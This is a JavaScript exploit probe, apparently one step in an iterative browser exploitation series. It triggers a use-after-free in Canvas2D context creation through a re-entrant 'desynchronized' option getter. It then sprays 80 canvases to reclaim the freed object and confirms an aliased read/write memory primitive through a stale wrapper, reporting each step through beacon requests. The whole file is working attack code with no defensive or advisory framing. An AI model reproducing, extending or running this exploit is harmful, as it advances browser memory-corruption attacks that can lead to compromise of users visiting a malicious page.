// CRASH_CLASS: MODERATE
// PROBE p553: Canvas UAF write primitive confirmation
//
// p552 confirmed same-type reclaim (CHANNEL-OK) but OOM'd before testing
// write via setTransform on stale wrapper. This probe is lean:
//   Step 1: Trigger UAF via desynchronized getter
//   Step 2: Spray 80 Canvas2D with sentinel transform (same-type reclaim)
//   Step 3: Verify channel (getTransform reads sentinel from stale wrapper)
//   Step 4: WRITE via setTransform on stale wrapper
//   Step 5: Find which spray canvas received the write (bidirectional alias)
//   Step 6: Probe field aliasing — what Canvas2D internal fields overlap?

document.write('<pre id="log" style="color:#0f0;background:#000;font:13px monospace;padding:8px;white-space:pre-wrap"></pre>');

(function () {
  var logEl = document.getElementById('log');
  var retained = [];

  function emit(tag, msg) {
    var line = tag + ' ' + msg;
    logEl.textContent += line + '\n';
    try {
      new Image().src = '/beacon/P553-' + encodeURIComponent(tag) +
        '?d=' + encodeURIComponent(msg.slice(0, 350));
    } catch (e) {}
  }

  emit('START', 'ua=' + navigator.userAgent.slice(0, 80));

  // ===================== STEP 1: Trigger UAF =====================

  var canvas = document.createElement('canvas');
  canvas.width = 1;
  canvas.height = 1;
  document.body.appendChild(canvas);
  retained.push(canvas);

  var inner = null;
  var getterFired = 0;
  var opts = {};

  Object.defineProperty(opts, 'desynchronized', {
    get: function () {
      getterFired++;
      if (getterFired === 1) {
        inner = canvas.getContext('2d');
      }
      return false;
    },
    enumerable: true
  });

  var outer = null;
  try {
    outer = canvas.getContext('2d', opts);
  } catch (e) {
    emit('ERR', 'getContext threw: ' + e);
    return;
  }

  retained.push(outer, inner);

  emit('TRIGGER', 'getter=' + getterFired +
    ' inner=' + !!inner + ' outer=' + !!outer +
    ' same=' + (outer === inner));

  if (outer === inner || !inner) {
    emit('PATCHED', 'no UAF');
    return;
  }

  // ===================== STEP 2: Same-type reclaim (lean) =====================

  var SPRAY = 80;
  var SA = 11.110011, SB = 22.220022, SC = 33.330033;
  var SD = 44.440044, SE = 55.550055, SF = 66.660066;

  var sprayCtx = [];
  for (var i = 0; i < SPRAY; i++) {
    var c = document.createElement('canvas');
    c.width = 1;
    c.height = 1;
    var ctx = c.getContext('2d');
    if (ctx) {
      ctx.setTransform(SA, SB, SC, SD, SE, SF);
      sprayCtx.push(ctx);
      retained.push(c, ctx);
    }
  }

  emit('SPRAYED', 'n=' + sprayCtx.length);

  // ===================== STEP 3: Channel verification =====================

  var m = null;
  try {
    m = inner.getTransform();
  } catch (e) {
    emit('READ-ERR', String(e));
  }

  if (!m) {
    emit('READ-FAIL', 'getTransform null');
    return;
  }

  var EPS = 0.0001;
  function close(x, y) { return Math.abs(x - y) < EPS; }

  var match = close(m.a, SA) && close(m.b, SB) && close(m.c, SC) &&
    close(m.d, SD) && close(m.e, SE) && close(m.f, SF);

  emit('MATRIX', 'a=' + m.a + ' b=' + m.b + ' c=' + m.c +
    ' d=' + m.d + ' e=' + m.e + ' f=' + m.f);

  if (!match) {
    emit('NO-RECLAIM', 'sentinel mismatch — reclaim failed with ' + SPRAY + ' canvases');
    return;
  }

  emit('CHANNEL-OK', 'sentinel match confirmed');

  // ===================== STEP 4: WRITE via setTransform =====================

  var WA = 99.001, WB = 88.002, WC = 77.003;
  var WD = 66.004, WE = 55.005, WF = 44.006;

  emit('WRITE-TEST', 'writing ' + WA + '/' + WB + '/' + WC + '/' + WD + '/' + WE + '/' + WF);

  try {
    inner.setTransform(WA, WB, WC, WD, WE, WF);
  } catch (e) {
    emit('WRITE-ERR', 'setTransform threw: ' + e);
    return;
  }

  // Read back through stale wrapper
  var m2 = null;
  try {
    m2 = inner.getTransform();
  } catch (e) {
    emit('READBACK-ERR', String(e));
  }

  if (m2) {
    emit('READBACK', 'a=' + m2.a + ' b=' + m2.b + ' c=' + m2.c +
      ' d=' + m2.d + ' e=' + m2.e + ' f=' + m2.f);

    if (close(m2.a, WA) && close(m2.b, WB)) {
      emit('WRITE-OK', 'write stuck — R/W primitive CONFIRMED');
    } else {
      emit('WRITE-MISS', 'readback does not match written values');
    }
  }

  // ===================== STEP 5: Find aliased spray canvas =====================

  emit('ALIAS-SCAN', 'checking ' + sprayCtx.length + ' spray contexts');

  var aliasIdx = -1;
  for (var j = 0; j < sprayCtx.length; j++) {
    try {
      var sm = sprayCtx[j].getTransform();
      if (sm && close(sm.a, WA) && close(sm.b, WB) && close(sm.c, WC)) {
        aliasIdx = j;
        emit('ALIAS-FOUND', 'spray[' + j + '] has our written values — BIDIRECTIONAL ALIAS');
        break;
      }
    } catch (e) {}
  }

  if (aliasIdx === -1) {
    emit('ALIAS-NONE', 'no spray canvas has written values — write may be one-directional');

    // Check if any spray canvas lost its sentinel
    var changed = 0;
    for (var k = 0; k < sprayCtx.length; k++) {
      try {
        var km = sprayCtx[k].getTransform();
        if (km && !close(km.a, SA)) {
          changed++;
          if (changed <= 3) {
            emit('ALIAS-CHANGED', 'spray[' + k + '] a=' + km.a + ' b=' + km.b);
          }
        }
      } catch (e) {}
    }
    emit('ALIAS-CHANGED-COUNT', 'total=' + changed + ' of ' + sprayCtx.length);
  }

  // ===================== STEP 6: Write-through-read — stale writes, spray reads =====================

  if (aliasIdx >= 0) {
    // Write through spray canvas, read through stale wrapper
    var alias = sprayCtx[aliasIdx];

    emit('REVERSE-TEST', 'writing via spray[' + aliasIdx + '], reading via stale');
    try {
      alias.setTransform(1.23, 4.56, 7.89, 10.11, 12.13, 14.15);
      var rm = inner.getTransform();
      if (rm) {
        emit('REVERSE-READ', 'a=' + rm.a + ' b=' + rm.b + ' c=' + rm.c +
          ' d=' + rm.d + ' e=' + rm.e + ' f=' + rm.f);
        if (close(rm.a, 1.23) && close(rm.b, 4.56)) {
          emit('REVERSE-OK', 'FULL BIDIRECTIONAL R/W CONFIRMED');
        }
      }
    } catch (e) {
      emit('REVERSE-ERR', String(e));
    }
  }

  // ===================== STEP 7: Numeric property aliasing =====================

  emit('PROP-TEST', 'testing numeric property overlap');

  // Write lineWidth through stale, read from alias (or vice versa)
  try {
    inner.lineWidth = 31337.5;
    inner.globalAlpha = 0.42;
    inner.shadowBlur = 9999.25;
    inner.shadowOffsetX = 12345.75;
    inner.shadowOffsetY = 67890.125;
    inner.miterLimit = 777.5;
    inner.lineDashOffset = 333.25;

    emit('PROP-STALE', 'lineWidth=' + inner.lineWidth +
      ' globalAlpha=' + inner.globalAlpha +
      ' shadowBlur=' + inner.shadowBlur +
      ' shadowOffsetX=' + inner.shadowOffsetX +
      ' shadowOffsetY=' + inner.shadowOffsetY +
      ' miterLimit=' + inner.miterLimit +
      ' lineDashOffset=' + inner.lineDashOffset);

    if (aliasIdx >= 0) {
      var a = sprayCtx[aliasIdx];
      emit('PROP-ALIAS', 'lineWidth=' + a.lineWidth +
        ' globalAlpha=' + a.globalAlpha +
        ' shadowBlur=' + a.shadowBlur +
        ' shadowOffsetX=' + a.shadowOffsetX +
        ' shadowOffsetY=' + a.shadowOffsetY +
        ' miterLimit=' + a.miterLimit +
        ' lineDashOffset=' + a.lineDashOffset);
    }
  } catch (e) {
    emit('PROP-ERR', String(e));
  }

  // ===================== STEP 8: State stack probe =====================

  emit('STATE-TEST', 'save/restore on stale wrapper');
  try {
    inner.save();
    inner.lineWidth = 11111;
    inner.save();
    inner.lineWidth = 22222;
    inner.restore();
    emit('STATE-RESTORE1', 'lineWidth=' + inner.lineWidth);
    inner.restore();
    emit('STATE-RESTORE2', 'lineWidth=' + inner.lineWidth);
  } catch (e) {
    emit('STATE-ERR', String(e));
  }

  emit('ALIVE', 'probe completed');
  window.__p553 = retained;
})();
